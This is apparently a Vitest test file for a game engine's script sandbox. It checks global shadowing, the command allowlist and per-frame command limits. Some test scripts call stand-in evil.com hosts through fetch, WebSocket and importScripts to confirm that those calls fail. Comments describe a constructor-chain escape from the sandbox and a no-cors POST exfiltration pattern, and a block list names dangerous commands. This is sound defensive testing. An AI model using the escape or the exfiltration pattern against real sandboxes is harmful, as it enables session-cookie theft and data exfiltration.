/**
 * Script sandbox security tests.
 *
 * Tests the key security mechanisms that protect the script sandbox:
 * 1. Global shadowing via Function constructor
 * 2. Command whitelist enforcement
 * 3. Per-frame command limits
 *
 * Since scriptWorker.ts runs inside a Web Worker, we replicate the core
 * security patterns here for testability.
 */

import { describe, it, expect } from 'vitest';
import { SHADOWED_GLOBALS } from '../sandboxGlobals';
// The real shipped allowlist, not a copy of it. A local literal here made
// every allow/deny assertion below tautological (PF-1181).
import { SCRIPT_ALLOWED_COMMANDS, isScriptAllowedCommand } from '../scriptAllowlist';

/**
 * Replicates the compileScript() Function constructor pattern.
 * Returns the lifecycle hooks extracted from a user script.
 *
 * `shadowValue` is what every entry of SHADOWED_GLOBALS is bound to. Production
 * passes `undefined` (scriptWorker.ts, compileScript) and so does the default
 * here. The binding proof below compiles with a sentinel instead, because a
 * `typeof X === 'undefined'` assertion is tautological for every name the test
 * realm does not define anyway (importScripts, Worker, window under node) — it
 * passes whether the shadow works or not. That is how ten assertion-free tests
 * survived in this block (#9443).
 */
function compileSandboxed(
  source: string,
  forgeApi: Record<string, unknown> = {},
  shadowValue: unknown = undefined,
) {
  const fn = new Function(
    'forge', 'entityId',
    ...SHADOWED_GLOBALS,
    `
    ${source}
    return {
      onStart: typeof onStart === 'function' ? onStart : undefined,
      onUpdate: typeof onUpdate === 'function' ? onUpdate : undefined,
      onDestroy: typeof onDestroy === 'function' ? onDestroy : undefined
    };
    `
  );
  // One argument per shadowed global, same shape as scriptWorker's call.
  return fn(forgeApi, 'test-entity', ...SHADOWED_GLOBALS.map(() => shadowValue));
}

/** Bound to the shadow parameters when the test is proving the binding itself. */
const SHADOW_SENTINEL = '__sandbox-shadow-sentinel__';

/** The shipped list length, pinned so a silently dropped entry fails the suite. */
const EXPECTED_SHADOWED_GLOBAL_COUNT = 21;

const MAX_COMMANDS_PER_FRAME = 100;

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

describe('Script Sandbox Security', () => {
  describe('global shadowing', () => {
    // Binding proof, one case per shipped name. Reading the identifier back
    // through onStart's return value is the only surface compileSandboxed
    // actually exposes — the closures and getError()/getResults() accessors this
    // block used to define were never returned, so nothing was ever asserted
    // (#9443). The sentinel makes the case non-tautological: the script can only
    // read it back if the identifier resolved to the sandbox parameter. Drop a
    // name from SHADOWED_GLOBALS and this goes red either way — the host global
    // answers instead (fetch, Reflect, Atomics) or the identifier is a
    // ReferenceError (importScripts, Worker, window under node).
    it.each([...SHADOWED_GLOBALS])(
      'binds %s to the sandbox parameter rather than the host global',
      (name) => {
        const result = compileSandboxed(
          `function onStart() { return ${name}; }`,
          {},
          SHADOW_SENTINEL,
        );
        expect(result.onStart()).toBe(SHADOW_SENTINEL);
      },
    );

    it('pins the shipped shadow list length', () => {
      // Membership is pinned by sandboxGlobals.test.ts; this pins the count so
      // dropping an entry cannot slip through as "one fewer it.each case ran".
      expect(SHADOWED_GLOBALS).toHaveLength(EXPECTED_SHADOWED_GLOBAL_COUNT);
    });

    it('should shadow fetch with undefined', () => {
      const result = compileSandboxed(`
        function onStart() { return typeof fetch; }
      `);
      expect(result.onStart()).toBe('undefined');
    });

    it('should make fetch inaccessible inside script', () => {
      // fetch is bound to undefined, so calling it is a TypeError.
      const result = compileSandboxed(`
        function onStart() {
          try { fetch('https://evil.com'); return 'CALLED'; }
          catch (e) { return e.constructor.name; }
        }
      `);
      expect(result.onStart()).toBe('TypeError');
    });

    it('should shadow XMLHttpRequest', () => {
      const result = compileSandboxed(`
        function onStart() { return typeof XMLHttpRequest; }
      `);
      expect(result.onStart()).toBe('undefined');
    });

    it('should shadow WebSocket', () => {
      const result = compileSandboxed(`
        function onStart() {
          try { new WebSocket('ws://evil.com'); return 'CONSTRUCTED'; }
          catch (e) { return e.constructor.name; }
        }
      `);
      expect(result.onStart()).toBe('TypeError');
    });

    it('should shadow self and globalThis', () => {
      const result = compileSandboxed(`
        function onStart() {
          return { self: typeof self, globalThis: typeof globalThis };
        }
      `);
      expect(result.onStart()).toEqual({ self: 'undefined', globalThis: 'undefined' });
    });

    it('should shadow importScripts', () => {
      const result = compileSandboxed(`
        function onStart() {
          try { importScripts('https://evil.com/script.js'); return 'CALLED'; }
          catch (e) { return e.constructor.name; }
        }
      `);
      expect(result.onStart()).toBe('TypeError');
    });

    it('should shadow all dangerous globals listed in SHADOWED_GLOBALS', () => {
      // Build a script that checks typeof for all shadowed globals and hands the
      // record back through onStart's return value.
      const checks = SHADOWED_GLOBALS.map(
        g => `results['${g}'] = typeof ${g};`
      ).join('\n');

      const script = `
        const results = {};
        function onStart() {
          ${checks}
          return results;
        }
      `;

      const result = compileSandboxed(script);
      const observed = result.onStart() as Record<string, string>;

      expect(Object.keys(observed)).toHaveLength(SHADOWED_GLOBALS.length);
      for (const g of SHADOWED_GLOBALS) {
        expect(observed[g], `${g} should read as undefined inside the sandbox`).toBe('undefined');
      }
    });

    it('should shadow Reflect to block meta-programming on forge API', () => {
      // Reflect.get / Reflect.set could be used to extract references from
      // the forge object even if it is frozen. Shadowing Reflect prevents this.
      const calls: string[] = [];
      const mockForge = {
        _carrier: { secret: 'do-not-leak' },
        transform: { setPosition: () => calls.push('ok') },
      };

      const result = compileSandboxed(`
        function onStart() {
          let reflected = 'NOT-RUN';
          let thrown = 'NONE';
          try {
            reflected = Reflect.get(forge, '_carrier');
          } catch (e) {
            thrown = e.constructor.name;
          }
          // forge itself must still work — the shadow does not break the API.
          forge.transform.setPosition(0, 0, 0);
          return { reflectType: typeof Reflect, reflected, thrown };
        }
      `, mockForge as unknown as Record<string, unknown>);

      const observed = result.onStart();
      expect(observed.reflectType).toBe('undefined');
      // Reflect is undefined, so the member access throws before it can read
      // _carrier — the secret never reaches the script.
      expect(observed.thrown).toBe('TypeError');
      expect(observed.reflected).toBe('NOT-RUN');
      expect(calls).toEqual(['ok']);
    });

    it('should shadow Proxy to block interception of forge property access', () => {
      // A script could wrap forge in a Proxy to intercept all property reads and
      // log or exfiltrate method references. Shadowing Proxy prevents creating
      // such wrappers inside the sandbox: `new Proxy(...)` throws because Proxy
      // is bound to undefined, so no wrapper is ever constructed.
      const result = compileSandboxed(`
        function onStart() {
          let proxyCreated = false;
          let thrown = 'NONE';
          try {
            new Proxy({}, {});
            proxyCreated = true;
          } catch (e) {
            thrown = e.constructor.name;
          }
          return { proxyType: typeof Proxy, proxyCreated, thrown };
        }
      `);

      const observed = result.onStart();
      expect(observed.proxyType).toBe('undefined');
      expect(observed.proxyCreated).toBe(false);
      expect(observed.thrown).toBe('TypeError');
    });

    it('should shadow window to prevent DOM/global access in exported scripts', () => {
      // Exported scripts run in a browser context where window is the global.
      // Shadowing it prevents scripts from accessing window.localStorage,
      // window.document, etc.
      const result = compileSandboxed(`
        function onStart() { return typeof window; }
      `);
      expect(result.onStart()).toBe('undefined');
    });

    it('should shadow SharedArrayBuffer to block timing side-channels', () => {
      // SharedArrayBuffer enables high-resolution timing via Atomics.wait, which
      // could be used for Spectre-style attacks or fingerprinting.
      const result = compileSandboxed(`
        function onStart() { return typeof SharedArrayBuffer; }
      `);
      expect(result.onStart()).toBe('undefined');
    });

    it('should shadow Atomics alongside SharedArrayBuffer', () => {
      const result = compileSandboxed(`
        function onStart() { return typeof Atomics; }
      `);
      expect(result.onStart()).toBe('undefined');
    });

    it('should still provide forge API access', () => {
      let called = false;
      const mockForge = {
        transform: {
          setPosition: () => { called = true; },
        },
      };

      const result = compileSandboxed(`
        function onStart() { forge.transform.setPosition(0, 0, 0); }
      `, mockForge);
      result.onStart();

      expect(called).toBe(true);
    });

    it('should provide entityId to scripts', () => {
      const result = compileSandboxed(`
        function onStart() { return entityId; }
      `);
      expect(result.onStart()).toBe('test-entity');
    });
  });

  describe('script lifecycle hooks', () => {
    it('should extract onStart function', () => {
      const result = compileSandboxed(`function onStart() {}`);
      expect(result.onStart).toBeTypeOf('function');
    });

    it('should extract onUpdate function', () => {
      const result = compileSandboxed(`function onUpdate(dt) {}`);
      expect(result.onUpdate).toBeTypeOf('function');
    });

    it('should extract onDestroy function', () => {
      const result = compileSandboxed(`function onDestroy() {}`);
      expect(result.onDestroy).toBeTypeOf('function');
    });

    it('should return undefined for missing hooks', () => {
      const result = compileSandboxed(`const x = 42;`);
      expect(result.onStart).toBeUndefined();
      expect(result.onUpdate).toBeUndefined();
      expect(result.onDestroy).toBeUndefined();
    });

    it('should handle scripts with all three hooks', () => {
      const result = compileSandboxed(`
        function onStart() {}
        function onUpdate(dt) {}
        function onDestroy() {}
      `);
      expect(result.onStart).toBeTypeOf('function');
      expect(result.onUpdate).toBeTypeOf('function');
      expect(result.onDestroy).toBeTypeOf('function');
    });
  });

  describe('compilation error handling', () => {
    it('should throw on syntax errors', () => {
      expect(() => compileSandboxed(`function onStart( {`)).toThrow();
    });

    it('should throw on invalid token', () => {
      expect(() => compileSandboxed(`const @@ = 5;`)).toThrow();
    });

    it('should not throw on empty script', () => {
      const result = compileSandboxed('');
      expect(result.onStart).toBeUndefined();
    });
  });

  describe('command whitelist', () => {
    it('should allow all transform commands', () => {
      expect(SCRIPT_ALLOWED_COMMANDS.has('update_transform')).toBe(true);
      expect(SCRIPT_ALLOWED_COMMANDS.has('spawn_entity')).toBe(true);
      expect(SCRIPT_ALLOWED_COMMANDS.has('delete_entities')).toBe(true);
    });

    it('should allow physics commands', () => {
      expect(SCRIPT_ALLOWED_COMMANDS.has('apply_force')).toBe(true);
      expect(SCRIPT_ALLOWED_COMMANDS.has('apply_impulse')).toBe(true);
      expect(SCRIPT_ALLOWED_COMMANDS.has('set_velocity')).toBe(true);
    });

    it('should allow 2D physics commands', () => {
      expect(SCRIPT_ALLOWED_COMMANDS.has('apply_force2d')).toBe(true);
      expect(SCRIPT_ALLOWED_COMMANDS.has('apply_impulse2d')).toBe(true);
      expect(SCRIPT_ALLOWED_COMMANDS.has('set_velocity2d')).toBe(true);
      expect(SCRIPT_ALLOWED_COMMANDS.has('set_angular_velocity2d')).toBe(true);
    });

    it('should allow audio commands', () => {
      expect(SCRIPT_ALLOWED_COMMANDS.has('play_audio')).toBe(true);
      expect(SCRIPT_ALLOWED_COMMANDS.has('stop_audio')).toBe(true);
      expect(SCRIPT_ALLOWED_COMMANDS.has('audio_crossfade')).toBe(true);
    });

    it('should allow animation commands', () => {
      expect(SCRIPT_ALLOWED_COMMANDS.has('play_animation')).toBe(true);
      expect(SCRIPT_ALLOWED_COMMANDS.has('stop_animation')).toBe(true);
      expect(SCRIPT_ALLOWED_COMMANDS.has('play_sprite_animation')).toBe(true);
    });

    it('should allow camera commands', () => {
      expect(SCRIPT_ALLOWED_COMMANDS.has('camera_follow')).toBe(true);
      expect(SCRIPT_ALLOWED_COMMANDS.has('camera_set_position')).toBe(true);
      expect(SCRIPT_ALLOWED_COMMANDS.has('camera_look_at')).toBe(true);
    });

    it('should allow tilemap commands', () => {
      expect(SCRIPT_ALLOWED_COMMANDS.has('paint_tile')).toBe(true);
      expect(SCRIPT_ALLOWED_COMMANDS.has('erase_tile')).toBe(true);
      expect(SCRIPT_ALLOWED_COMMANDS.has('fill_tiles')).toBe(true);
    });

    it('does not allow tilemap names the engine has never had', () => {
      // PF-1181: `set_tile`, `clear_tiles` and `resize_tilemap` were allowlisted
      // for their whole life and none of them is an engine command, so every
      // tilemap write a script made was dropped without a word.
      for (const name of ['set_tile', 'clear_tiles', 'resize_tilemap']) {
        expect(SCRIPT_ALLOWED_COMMANDS.has(name)).toBe(false);
      }
    });

    it('should allow skeleton 2D commands', () => {
      expect(SCRIPT_ALLOWED_COMMANDS.has('create_skeleton2d')).toBe(true);
      expect(SCRIPT_ALLOWED_COMMANDS.has('play_skeletal_animation2d')).toBe(true);
      expect(SCRIPT_ALLOWED_COMMANDS.has('set_ik_target2d')).toBe(true);
    });

    it('should block dangerous commands not in whitelist', () => {
      const dangerousCommands = [
        'delete_project',
        'execute_sql',
        'eval_code',
        'load_external_script',
        'modify_auth',
        'reset_database',
        'export_user_data',
        'admin_override',
      ];
      for (const cmd of dangerousCommands) {
        expect(SCRIPT_ALLOWED_COMMANDS.has(cmd)).toBe(false);
      }
    });

    it('should block editor-only commands from scripts', () => {
      const editorCommands = [
        'create_joint',
        'update_joint',
        'remove_joint',
        'update_physics',
        'set_environment',
        'toggle_debug_physics',
        'create_csg_union',
        'import_gltf',
        'export_scene',
      ];
      for (const cmd of editorCommands) {
        expect(SCRIPT_ALLOWED_COMMANDS.has(cmd)).toBe(false);
      }
    });

    it('should have the stop command for scene control', () => {
      expect(SCRIPT_ALLOWED_COMMANDS.has('stop')).toBe(true);
    });
  });

  describe('command limit per frame', () => {
    it('should enforce MAX_COMMANDS_PER_FRAME constant', () => {
      expect(MAX_COMMANDS_PER_FRAME).toBe(100);
    });

    it('should truncate commands exceeding the limit', () => {
      // Replicate flushCommands logic
      let pendingCommands = Array.from({ length: 150 }, (_, i) => ({
        cmd: 'update_transform',
        entityId: `e${i}`,
      }));

      let errorSent = false;
      if (pendingCommands.length > MAX_COMMANDS_PER_FRAME) {
        errorSent = true;
        pendingCommands = pendingCommands.slice(0, MAX_COMMANDS_PER_FRAME);
      }

      expect(errorSent).toBe(true);
      expect(pendingCommands).toHaveLength(100);
    });

    it('should not truncate commands within the limit', () => {
      const pendingCommands = Array.from({ length: 50 }, (_, i) => ({
        cmd: 'update_transform',
        entityId: `e${i}`,
      }));

      const shouldTruncate = pendingCommands.length > MAX_COMMANDS_PER_FRAME;

      expect(shouldTruncate).toBe(false);
      expect(pendingCommands).toHaveLength(50);
    });

    it('should handle exactly MAX_COMMANDS_PER_FRAME', () => {
      const pendingCommands = Array.from({ length: 100 }, (_, i) => ({
        cmd: 'update_transform',
        entityId: `e${i}`,
      }));

      const shouldTruncate = pendingCommands.length > MAX_COMMANDS_PER_FRAME;

      expect(shouldTruncate).toBe(false);
      expect(pendingCommands).toHaveLength(100);
    });
  });

  describe('forge API exposure', () => {
    it('should call forge methods when invoked from scripts', () => {
      const calls: string[] = [];
      const mockForge = {
        transform: {
          setPosition: () => calls.push('setPosition'),
          setRotation: () => calls.push('setRotation'),
        },
        physics: {
          applyForce: () => calls.push('applyForce'),
        },
      };

      const result = compileSandboxed(`
        function onStart() {
          forge.transform.setPosition(1, 2, 3);
          forge.physics.applyForce(0, 10, 0);
        }
      `, mockForge);
      result.onStart();

      expect(calls).toEqual(['setPosition', 'applyForce']);
    });

    it('should pass correct arguments through forge API', () => {
      let capturedArgs: number[] = [];
      const mockForge = {
        transform: {
          setPosition: (x: number, y: number, z: number) => { capturedArgs = [x, y, z]; },
        },
      };

      const result = compileSandboxed(`
        function onStart() { forge.transform.setPosition(10, 20, 30); }
      `, mockForge);
      result.onStart();

      expect(capturedArgs).toEqual([10, 20, 30]);
    });

    it('should pass dt to onUpdate', () => {
      const result = compileSandboxed(`
        let dt_value = 0;
        function onUpdate(dt) { dt_value = dt; }
      `, {});
      // onUpdate receives dt from the tick message
      if (result.onUpdate) {
        result.onUpdate(0.016);
      }
      expect(result.onUpdate).toBeDefined();
    });
  });

  describe('nested Function constructor limitation', () => {
    it('should compile scripts that attempt Function constructor without crashing', () => {
      // The Function constructor creates functions in the global scope,
      // bypassing our parameter-shadowing sandbox. Do NOT assume CSP saves us:
      // the editor's CSP permits unsafe-eval (the script compiler itself uses
      // the Function constructor), so eval/Function are live in the editor
      // worker. The capability boundary is instead: (a) Web Worker isolation
      // (no DOM), (b) the command whitelist in the message handler, and
      // crucially (c) revokeNetworkGlobals() at worker init, which deletes
      // fetch/XHR/WebSocket/storage from the worker global so an escaped script
      // has no network capability to abuse (#8607). This test only verifies that
      // such scripts compile and run without throwing at the sandbox level.
      const result = compileSandboxed(`
        function onStart() {
          try {
            // Authors may reach eval; it is NOT blocked in the editor worker
            // (unsafe-eval is permitted). It simply has no network/storage
            // capability left to abuse after revokeNetworkGlobals().
            (0, eval)('1 + 1');
          } catch (_e) {
            // Only thrown if a stricter host CSP forbids eval (e.g. the exported
            // /play/ bundle); the editor worker permits it.
          }
        }
      `);
      expect(result.onStart).toBeTypeOf('function');
    });

    it('the constructor.constructor escape is live, but its network capability is revoked at worker init', () => {
      // The pattern (0).constructor.constructor('return fetch')() reaches the
      // real Function constructor via the prototype chain even when the Function
      // parameter is shadowed, because .constructor on a number yields the
      // built-in Number constructor, and .constructor on that yields Function.
      //
      // What shadowing does and does NOT do:
      // - Shadowing Function/eval/Reflect blocks only the naive *direct-name*
      //   cases (Function(...), eval(...), Reflect.construct(Function, ...)).
      // - It does NOT block the constructor-chain escape above — that bypasses
      //   the parameter shadow entirely and is impossible to stop in pure JS
      //   (we cannot shadow Function for real; the compiler needs it).
      //
      // Why this used to be exploitable (#8607): the script worker is SAME-ORIGIN
      // to the editor, so an escaped `fetch` carries the author's session cookies,
      // and a `fetch(attacker, {mode:'no-cors', method:'POST', body})` exfiltrates
      // cross-origin regardless of CORS (no response read is needed). The earlier
      // comment here claimed "the Worker has no useful origin — limited to
      // cross-origin requests blocked by CORS"; that was false on both counts.
      //
      // The actual mitigation is capability removal, not name hiding:
      // revokeNetworkGlobals() runs at worker module init and deletes
      // fetch/XHR/WebSocket/EventSource/BroadcastChannel/indexedDB/caches from the
      // worker global, so the escaped `Function('return fetch')()` resolves to
      // undefined. That is proven directly in revokeNetworkGlobals.test.ts. A
      // fuller boundary (sandboxed origin with connect-src 'none', or an AST
      // interpreter instead of Function()) is tracked as follow-up work in #8700.
      //
      // This test runs in the node test realm where revokeNetworkGlobals() is not
      // applied, so it only asserts the escape compiles/runs without throwing —
      // the capability-revocation proof lives in revokeNetworkGlobals.test.ts.
      const result = compileSandboxed(`
        function onStart() {
          try {
            // Prototype-chain escape — live in the editor (unsafe-eval permitted).
            const escapedFn = (0).constructor.constructor('return 42');
            void escapedFn();
          } catch (_e) {
            // Only thrown under a stricter host CSP (e.g. the exported /play/ bundle).
          }
        }
      `);
      expect(result.onStart).toBeTypeOf('function');
      // Compilation and execution must not throw — the escape is real; the network
      // capability it would reach is revoked at worker init (see #8607).
      expect(() => result.onStart()).not.toThrow();
    });
  });

  describe('forge API defensive behavior', () => {
    it('should isolate prototype modifications within sandbox scope', () => {
      // The sandbox uses a Function constructor, so the forge object passed in
      // is a plain object. The real security boundary is Web Worker isolation —
      // each script runs in its own Worker with no DOM/window access.
      // Here we verify that compileSandboxed returns callable hooks even when
      // the script attempts __proto__ manipulation.
      const mockForge = {
        transform: { setPosition: () => {} },
      };

      const result = compileSandboxed(`
        function onStart() {
          try {
            forge.__proto__.test = true;
          } catch (_e) {
            // May throw in strict mode environments
          }
        }
      `, mockForge);

      // Hook extraction and execution should succeed regardless
      expect(result.onStart).toBeTypeOf('function');
      expect(() => result.onStart()).not.toThrow();
    });

    it('should not allow overwriting forge namespace properties', () => {
      let called = false;
      const mockForge = Object.freeze({
        transform: Object.freeze({
          setPosition: () => { called = true; },
        }),
      });

      const result = compileSandboxed(`
        function onStart() {
          try {
            forge.transform = { setPosition: () => {} };
          } catch (_e) {
            // May throw in frozen objects
          }
          forge.transform.setPosition(0, 0, 0);
        }
      `, mockForge);
      result.onStart();

      // forge is frozen so the overwrite silently fails (or throws — caught above),
      // meaning the original setPosition is still called and `called` must be true
      expect(called).toBe(true);
    });

    it('should handle accessing non-existent forge sub-APIs gracefully', () => {
      const mockForge = {
        transform: { setPosition: () => {} },
      };

      const result = compileSandboxed(`
        let errorCaught = false;
        function onStart() {
          try {
            forge.nonExistentApi.doSomething();
          } catch (_e) {
            errorCaught = true;
          }
        }
      `, mockForge);

      // Should not throw at compilation or execution — error is caught in script
      expect(() => result.onStart()).not.toThrow();
    });

    it('should not leak forge API between scripts', () => {
      const calls1: string[] = [];
      const calls2: string[] = [];

      const forge1 = {
        transform: { setPosition: () => calls1.push('forge1') },
      };
      const forge2 = {
        transform: { setPosition: () => calls2.push('forge2') },
      };

      const script1 = compileSandboxed(`
        function onStart() { forge.transform.setPosition(0,0,0); }
      `, forge1);
      const script2 = compileSandboxed(`
        function onStart() { forge.transform.setPosition(0,0,0); }
      `, forge2);

      script1.onStart();
      script2.onStart();

      expect(calls1).toEqual(['forge1']);
      expect(calls2).toEqual(['forge2']);
    });
  });

  describe('script error isolation', () => {
    it('should not prevent other hooks from being extracted when one hook throws', () => {
      // A syntax error would prevent compilation entirely, but runtime errors
      // in one hook should not affect extraction of other hooks
      const result = compileSandboxed(`
        function onStart() { throw new Error('start failed'); }
        function onUpdate(dt) { return dt; }
        function onDestroy() {}
      `);

      expect(result.onStart).toBeTypeOf('function');
      expect(result.onUpdate).toBeTypeOf('function');
      expect(result.onDestroy).toBeTypeOf('function');
    });

    it('should isolate onStart errors from onUpdate execution', () => {
      const forgeState = { updateCalled: false };
      const result = compileSandboxed(`
        function onStart() { throw new Error('init crash'); }
        function onUpdate(_dt) { forge.updateCalled = true; }
      `, forgeState);

      // onStart throws but onUpdate should still be a callable function
      expect(() => result.onStart()).toThrow('init crash');
      expect(result.onUpdate).toBeTypeOf('function');
      result.onUpdate(0);
      expect(forgeState.updateCalled).toBe(true);
    });

    it('should isolate onUpdate errors from onDestroy execution', () => {
      const result = compileSandboxed(`
        function onUpdate(_dt) { throw new Error('tick crash'); }
        function onDestroy() {}
      `);

      expect(() => result.onUpdate(0.016)).toThrow('tick crash');
      expect(() => result.onDestroy()).not.toThrow();
    });

    it('should handle scripts that throw non-Error objects', () => {
      const result = compileSandboxed(`
        function onStart() { throw 'string error'; }
      `);

      expect(() => result.onStart()).toThrow('string error');
    });

    it('should handle scripts with infinite object creation gracefully', () => {
      // This tests that compilation succeeds; actual OOM is handled by Worker
      const result = compileSandboxed(`
        function onStart() {
          const arr = [];
          for (let i = 0; i < 1000; i++) arr.push({ x: i });
        }
      `);

      expect(result.onStart).toBeTypeOf('function');
      expect(() => result.onStart()).not.toThrow();
    });
  });

  describe('command payload structure', () => {
    it('should validate command names are strings', () => {
      // Replicate the flushCommands check: commands must have string cmd fields
      const validCommand = { cmd: 'update_transform', entityId: 'e1', x: 0, y: 1, z: 0 };
      expect(typeof validCommand.cmd).toBe('string');
      expect(SCRIPT_ALLOWED_COMMANDS.has(validCommand.cmd)).toBe(true);
    });

    it('should reject commands with numeric cmd values', () => {
      const badCommand = { cmd: 42 };
      expect(typeof badCommand.cmd).not.toBe('string');
    });

    it('should have expected total command count in whitelist', () => {
      // Keeps whitelist size visible — any additions should update this count.
      // This now pins the SHIPPED set: the former local copy had silently
      // drifted three names behind it and still asserted 59.
      expect(SCRIPT_ALLOWED_COMMANDS.size).toBe(62);
    });
  });

  // useScriptRunner gates on isScriptAllowedCommand(), not on the Set, so the
  // predicate is what actually decides whether a script command reaches the
  // engine. Pin that it agrees with the set it is derived from.
  describe('isScriptAllowedCommand', () => {
    it('agrees with the set for every allowed name', () => {
      const disallowed = [...SCRIPT_ALLOWED_COMMANDS].filter(name => !isScriptAllowedCommand(name));
      expect(disallowed).toEqual([]);
    });

    it('rejects names the engine never armed', () => {
      // The three that shipped in the allowlist for their whole life and were
      // never engine commands — dispatchCommand returns void, so they vanished
      // in silence rather than erroring (PF-1181).
      for (const name of ['set_tile', 'clear_tiles', 'resize_tilemap']) {
        expect(isScriptAllowedCommand(name)).toBe(false);
      }
    });

    it('rejects Object.prototype members rather than inheriting them', () => {
      // A plain-object lookup table would answer truthy for these; a Set does
      // not. Pinned because the table shape is the tempting refactor.
      for (const name of ['constructor', 'toString', '__proto__', 'hasOwnProperty']) {
        expect(isScriptAllowedCommand(name)).toBe(false);
      }
    });
  });
});
